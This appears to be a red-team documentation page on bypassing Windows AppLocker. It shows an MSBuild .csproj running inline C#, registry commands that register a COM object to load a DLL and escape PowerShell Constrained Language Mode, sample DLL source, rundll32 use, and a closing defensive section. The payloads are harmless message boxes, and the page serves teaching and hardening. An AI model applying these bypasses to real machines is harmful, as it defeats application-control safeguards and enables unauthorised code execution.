---
title: "Policy Bypasses"
date: 2026-09-25
weight: 2
type: docs
tags:
  - AppLocker
  - Application Control
  - Bypass
  - Active Directory
---

## Policy bypasses

Whether a given AppLocker bypass is available depends entirely on the policy in force, but a handful of weaknesses come up often enough to be worth checking for every time.

## Path wildcards

You will sometimes find a custom rule that permits execution from a directory but uses wildcards that are far too loose. Such a rule might look like this:

```xml
<FilePathRule Id="daecf627-c762-4c7d-849a-7eb9d4e9692e" Name="App-V" Description="" UserOrGroupSid="S-1-1-0" Action="Allow">
	<Conditions>
		<FilePathCondition Path="*\App-V\*"/>
	</Conditions>
</FilePathRule>
```

The problem is that the path is not anchored to a specific location such as `%PROGRAMFILES%` or `%WINDIR%`. As written, any executable sitting in a directory named *App-V*, wherever that directory happens to be, satisfies the rule and is allowed to run.

## Writeable directories

Several directories beneath the default `%WINDIR%\*` allow path are writeable by standard users. Any of these gives a place to drop an executable, script, or installer that policy will then permit to run. `Get-Acl` and `icacls` will help you find them. Commonly writeable examples include:

- `C:\Windows\Tasks`
- `C:\Windows\Temp`
- `C:\Windows\tracing`
- `C:\Windows\System32\spool\PRINTERS`
- `C:\Windows\System32\spool\SERVERS`
- `C:\Windows\System32\spool\drivers\color`

## LOLBAS

Some [LOLBAS](https://lolbas-project.github.io/) binaries that can execute arbitrary code double as AppLocker bypasses, precisely because they live in whitelisted locations such as `%WINDIR%\*`. [MSBuild](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/) is a good example, since it will run arbitrary C# supplied in a crafted `.csproj` file:

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuild/>
  </Target>
   <UsingTask
    TaskName="MSBuild"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Reference Include="System.Windows.Forms" />		
      <Code Type="Class" Language="cs">
        <![CDATA[
		using Microsoft.Build.Utilities;
		using System.Windows.Forms;

		public class MSBuild : Task
		{
			public override bool Execute()
			{
				MessageBox.Show("Hello World", "AppLocker Bypass");
				return true;
			}
		}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

## PowerShell Constrained Language Mode

When AppLocker is active it also drops PowerShell from *FullLanguage* into *ConstrainedLanguage*. The intent is to block the language features that can reach arbitrary Windows APIs, including a large portion of the .NET surface:

```powershell
PS C:\Users\bmarsh> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

PS C:\Users\bmarsh> [System.Console]::WriteLine("Hello World")
Cannot invoke method. Method invocation is supported only on core types in this language mode.
```

Those restrictions are not airtight. The `New-Object` cmdlet, for instance, still lets you load COM objects such as `WScript.Shell`:

```powershell
PS C:\Users\bmarsh> New-Object -ComObject WScript.Shell

SpecialFolders     CurrentDirectory
--------------     ----------------
System.__ComObject C:\Users\bmarsh
```

That capability can be turned into a bypass by registering a custom COM object that loads an arbitrary DLL into the PowerShell process. The mechanics are much the same as registering the registry entries used in the COM hijacking technique covered earlier:

```powershell
PS C:\Users\bmarsh> [System.Guid]::NewGuid()

Guid
----
6136e053-47cb-4fdd-84b1-381bc5f3edb3

C:\Users\bmarsh> New-Item -Path 'HKCU:Software\Classes\CLSID' -Name '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
C:\Users\bmarsh> New-Item -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}' -Name 'InprocServer32' -Value 'C:\Users\bmarsh\Desktop\bypass.dll'
C:\Users\bmarsh> New-ItemProperty -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}\InprocServer32' -Name 'ThreadingModel' -Value 'Both'

C:\Users\bmarsh> New-Item -Path 'HKCU:Software\Classes' -Name 'AppLocker.Bypass' -Value 'AppLocker Bypass'
C:\Users\bmarsh> New-Item -Path 'HKCU:Software\Classes\AppLocker.Bypass' -Name 'CLSID' -Value '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
```

The DLL behind it can be as simple as this:

```cpp
#include <windows.h>
#include <stdio.h>

extern "C" __declspec(dllexport) BOOL execute() {
	MessageBox(NULL, L"Hello World", L"AppLocker Bypass", 0);
	return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		return execute();
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}
```

## rundll32

AppLocker can enforce DLL rules as well, but they are rarely switched on because of the performance overhead they introduce. When DLL rules are not enabled, `rundll32` can be used to load an arbitrary DLL, provided the DLL exports at least one function for you to call. The Beacon DLL payload exports a function named `StartW` for exactly this purpose, intended to be invoked through rundll32.

## Defensive considerations

Most of these bypasses trace back to the permissive defaults rather than to AppLocker itself, so the fixes are about tightening the policy. Replace broad path rules with publisher or hash rules wherever practical, and audit any custom path rule for unanchored wildcards like `*\App-V\*`. Remove or explicitly deny execution from the user-writeable directories beneath `%WINDIR%`, since those undermine the `%WINDIR%\*` allow rule entirely. Deny or closely control the known LOLBAS binaries that can run arbitrary code, MSBuild among them. Enabling DLL rules closes the rundll32 and COM-DLL avenues at the cost of some performance, and pairing AppLocker with PowerShell Constrained Language Mode enforced through a language-mode-aware mechanism, rather than relying on AppLocker alone, makes the CLM escapes harder. Finally, run the policy in Enforce rather than Audit mode, and monitor the AppLocker event logs for blocked and, tellingly, allowed-but-unusual executions from those writeable paths.